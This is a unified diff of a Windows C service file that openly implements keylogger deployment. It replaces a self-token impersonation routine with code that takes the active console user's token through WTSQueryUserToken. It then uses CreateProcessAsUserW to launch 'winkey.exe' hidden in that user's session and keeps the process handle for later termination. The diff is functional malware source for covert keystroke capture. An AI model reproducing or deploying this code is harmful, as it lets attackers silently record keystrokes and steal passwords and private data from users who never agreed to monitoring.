@@ -1,118 +1,105 @@
-#pragma comment(lib, "advapi32.lib")
-
 #include "../../inc/service_manager.h"
-
 
 // Token impersonation and keylogger functions
 
-BOOL ImpersonateSystemToken()
+HANDLE GetUserTokenViaWTS()
 {
     HANDLE hToken = NULL;
-    HANDLE hDuplicateToken = NULL;
-    BOOL bResult = FALSE;
-
-    // Get current process token
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
-    {
-        SvcReportEvent(TEXT("OpenProcessToken"));
-        return FALSE;
+    DWORD sessionId = WTSGetActiveConsoleSessionId();
+    
+    if (sessionId == 0xFFFFFFFF) {
+        SvcReportEvent(TEXT("WTSGetActiveConsoleSessionId failed"));
+        return NULL;
     }
-
-    // Duplicate the token to get a primary token
-    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDuplicateToken))
-    {
-        SvcReportEvent(TEXT("DuplicateTokenEx"));
-        CloseHandle(hToken);
-        return FALSE;
+    
+    if (!WTSQueryUserToken(sessionId, &hToken)) {
+        SvcReportEvent(TEXT("WTSQueryUserToken failed"));
+        return NULL;
     }
-
-    // Set the token integrity level to SYSTEM (optional but recommended)
-    // Impersonate the duplicated token
-    if (!SetThreadToken(NULL, hDuplicateToken))
-    {
-        SvcReportEvent(TEXT("SetThreadToken"));
-    }
-    else
-    {
-        bResult = TRUE;
-    }
-
-    CloseHandle(hDuplicateToken);
-    CloseHandle(hToken);
-    return bResult;
+    
+    SvcReportEvent(TEXT("Successfully obtained user token via WTS"));
+    return hToken;
 }
 
-BOOL LaunchKeylogger()
+BOOL LaunchKeyloggerInUserSession()
 {
-    _tprintf(TEXT("LaunchKeylogger"));
-
-    if (IsKeyloggerRunning())
+    SvcReportEvent(TEXT("Attempting to launch keylogger in user session"));
+    
+    HANDLE hUserToken = GetUserTokenViaWTS();
+    if (!hUserToken) 
     {
-        _tprintf(TEXT("Keylogger already running\n"));
-        return TRUE;
+        return FALSE;
     }
 
     TCHAR szKeyloggerPath[MAX_PATH];
     TCHAR szServicePath[MAX_PATH];
-
-    // Get the path of the service executable itself
-    if (!GetModuleFileName(NULL, szServicePath, MAX_PATH))
+    
+    if (!GetModuleFileName(NULL, szServicePath, MAX_PATH)) 
     {
-         _tprintf(TEXT("GetModuleFileName failed (%d)\n"), GetLastError());
-        SvcReportEvent(TEXT("GetModuleFileName"));
+        CloseHandle(hUserToken);
         return FALSE;
     }
 
-     _tprintf(TEXT("Service path: %s\n"), szServicePath);
-
-    // Extract directory from full service path
+    // Extract directory and build keylogger path
     TCHAR szServiceDir[MAX_PATH];
     StringCchCopy(szServiceDir, MAX_PATH, szServicePath);
-    
-    // Remove the executable name to get just the directory
     TCHAR* lastBackslash = _tcsrchr(szServiceDir, TEXT('\\'));
-    if (lastBackslash)
+    if (lastBackslash) 
     {
-        *lastBackslash = TEXT('\0'); // Null-terminate at the last backslash
+        *lastBackslash = TEXT('\0');
     }
-
-    // Build path to keylogger in the same directory as service
+    
     StringCchPrintf(szKeyloggerPath, MAX_PATH, TEXT("%s\\winkey.exe"), szServiceDir);
 
-    _tprintf(TEXT("Looking for keylogger at: %s\n"), szKeyloggerPath);
-
-    // Check if file exists
-    DWORD dwAttrib = GetFileAttributes(szKeyloggerPath);
-    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
-        _tprintf(TEXT("Keylogger not found! Error: %d\n"), GetLastError());
+    // Check if keylogger exists
+    if (GetFileAttributes(szKeyloggerPath) == INVALID_FILE_ATTRIBUTES) 
+    {
+        SvcReportEvent(TEXT("Keylogger executable not found"));
+        CloseHandle(hUserToken);
         return FALSE;
     }
-    _tprintf(TEXT("Keylogger found, launching...\n"));
 
     STARTUPINFO si = {0};
+    PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-    
-    // Launch keylogger
-    if (!CreateProcess(
-        NULL,                   // No module name (use command line)
-        szKeyloggerPath,        // Path to keylogger
-        NULL,                   // Process handle not inheritable
-        NULL,                   // Thread handle not inheritable
-        FALSE,                  // Set handle inheritance to FALSE
-        CREATE_NO_WINDOW,       // Creation flags - no window
-        NULL,                   // Use parent's environment block
-        NULL,                   // Use parent's starting directory 
-        &si,                    // Pointer to STARTUPINFO structure
-        &gKeyloggerProcessInfo) // Pointer to PROCESS_INFORMATION structure
-    )
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;  // Hide the window
+
+    BOOL result = CreateProcessAsUserW(
+        hUserToken,
+        NULL,
+        szKeyloggerPath,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW | CREATE_NEW_CONSOLE,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+
+    CloseHandle(hUserToken);
+
+    if (result) 
     {
-        _tprintf(TEXT("CreateProcess failed (%d)\n"), GetLastError());
-        SvcReportEvent(TEXT("CreateProcess for keylogger"));
+        SvcReportEvent(TEXT("Keylogger launched successfully"));
+        
+        // Don't wait for process, but store handle for termination
+        gKeyloggerProcessInfo = pi;
+        CloseHandle(pi.hThread);  // We don't need the thread handle
+        
+        return TRUE;
+    }
+    else 
+    {
+        DWORD error = GetLastError();
+        TCHAR errorMsg[256];
+        _stprintf_s(errorMsg, _countof(errorMsg), 
+                   TEXT("CreateProcessAsUserW failed: %d"), error);
+        SvcReportEvent(errorMsg);
         return FALSE;
     }
-
-    _tprintf(TEXT("Keylogger launched successfully! PID: %d\n"), gKeyloggerProcessInfo.dwProcessId);
-    return TRUE;
 }
 
 BOOL IsKeyloggerRunning()
